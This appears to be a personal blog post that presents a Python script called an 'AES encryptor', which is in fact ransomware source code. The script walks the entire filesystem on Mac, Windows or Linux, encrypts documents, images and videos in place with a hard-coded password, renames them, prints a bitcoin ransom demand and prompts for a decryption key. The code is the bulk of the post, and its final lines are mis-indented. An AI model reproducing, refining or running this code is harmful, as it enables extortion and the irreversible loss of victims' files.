---
layout: ../../layouts/PostLayout.astro
title:  "Python AES Encryptor"
date:   2018-12-04 19:37:21 -0400
categories: python
---
<head>
	<style>
		body {
			background-color: #161b22;
			color: #c9d1d9;
		}
		a:hover, a:visited:hover{
			color:red;
		}
		a:visited {
			color: #c9d1d9;
		}
	</style>
</head>
<h1> Python AES Encryptor</h1>
<p>
Wrote python script, that searches files system based on OS and encrypts specific file types then asks for a key to then decrypt them. Repo can be found <a href="https://github.com/latortuga71/Python-Aes-encryptor">here</a>
</p>

``` python
import sys
import os
import os.path
import platform
import time
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from simplecrypt import encrypt, decrypt
from random import *
import string
import ast
from pickle import loads, dumps
file_list = []
dir_list = []
extension_tuple = ('.pdf','.txt','.docx','.doc','.zip','.xls','.xlsx','.rtf','.jpg','.png','.mpeg','.mpg','.mov','.mp4','.ppt','.pptx','.PDF')
encrypted_tuple = ('.encrypt')

def GetOs():
    operatingSystem = platform.system()
    print(operatingSystem)
    return operatingSystem

def GetFileList(OperatingSys,tuple):
   if OperatingSys == 'Darwin':
       root = os.path.abspath(os.sep)
       counter = 0
       for root, dirs, files in os.walk(root,topdown=True):
           for name in files:
               if name.endswith(tuple):
                 file_list.append(os.path.join(root,name))
                 counter +=1
                 print(counter)
            #for name in dirs:
          #print(name + ' Dir')
           #dir_list.append(name)
          #print(os.path.join(root,name))

   elif OperatingSys =='Windows':
        counter = 0
        root = os.path.abspath(os.sep)
        for root, dirs, files in os.walk(root,topdown=True):
            for name in files:
                if name.endswith(tuple):
                  file_list.append(os.path.join(root,name))
                  counter +=1
                  print(counter)

   else:
        counter = 0
        root = os.path.abspath(os.sep)
        for root, dirs, files in os.walk(root,topdown=True):
            for name in files:
                if name.endswith(tuple):
                  file_list.append(os.path.join(root,name))
                  counter +=1
                  print(counter)

   return print(file_list)


def Generate_rsa_key():
  private_key = RSA.generate(2048)
  public_key = private_key.publickey()
  with open ("private.pem", "wb") as prv_file:
      prv_file.write(private_key.exportKey('PEM'))
      prv_file.close()
  with open ("public.pem", "wb") as pub_file:
      pub_file.write(public_key.exportKey('PEM'))
      pub_file.close()
  aeskey2files = open('thekey.txt',"w")
  min_char = 12
  max_char = 16
  allchar = string.ascii_letters + string.punctuation + string.digits
  aeskey = "".join(choice(allchar) for x in range(16))
  print(aeskey)
  #aeskey = aeskey.encode('utf-8')
  aeskey2files = open('thekey.pem',"w")
  aeskey2files.write(aeskey)
  aeskey2files.close()


def encryptKey():
  fd = open('public.pem','rb')
  public_key = RSA.importKey(fd.read())
  fd.close()
  fd = open('thekey.txt','rb')
  unencrypted = fd.read()
  encrypted = public_key.encrypt(unencrypted,32)
  print(encrypted)
  dump = dumps(encrypted)
  with open('thekey.txt','wb') as output:
    output.write(dump)

def decryptKey():
  if os.path.isfile('private.pem') == True:
    print('file found')
    fd = open('private.pem','rb')
    private_key = RSA.importKey(fd.read())
    fd.close()
    fd = open('thekey.txt','rb')
    ciphertext = fd.read()
    print(ciphertext)
    decrypted = private_key.decrypt(ciphertext)
    with open('tesst','wb') as output:
      output.write(decrypted)


  else:
    print('notfound')


def Encrypt0r(file_name):
    password = "latortugaesrapido"
    fd = open(file_name, "rb")
    unencrypted_blob = fd.read()
    fd.close()
    with open(file_name,'wb') as output:
      ciphertext = encrypt(password,unencrypted_blob)
      output.write(ciphertext)
      os.rename(file_name,file_name + '.encrypt')


def Decrypt0r(password, filename, string=True):
    with open(filename, 'rb') as input:
      ciphertext = input.read()
      plaintext = decrypt(password, ciphertext)
      input.close()
      decryptedname = str(filename[:-8])
      print(type(decryptedname))
      with open(decryptedname,'wb') as f:
        print('created decrypted file')
        f.write(plaintext)
        print('successfully wrote text')
        os.remove(filename)
        print('successfully deleted encrypted copy')
          #return print(plaintext.decode('utf8'))








if __name__ == "__main__":
  #print(dir(AES))
  Generate_rsa_key()
  GetFileList(GetOs(),extension_tuple)
  #encryptKey()
  #decryptKey()
  for name in file_list:
    name = str(name)
    Encrypt0r(name)
  print("send us the bitcoin blah blah we'll send u the key")
  password_input = input("Your files have been encrypted for educational purposes! Enter the key below to decrypt your files: ")
  file_list = []
  GetFileList(GetOs(),encrypted_tuple)
  print(file_list)
  for name in file_list:
    name = str(name)
Decrypt0r(str(password_input),name)
{% endhighlight %}
```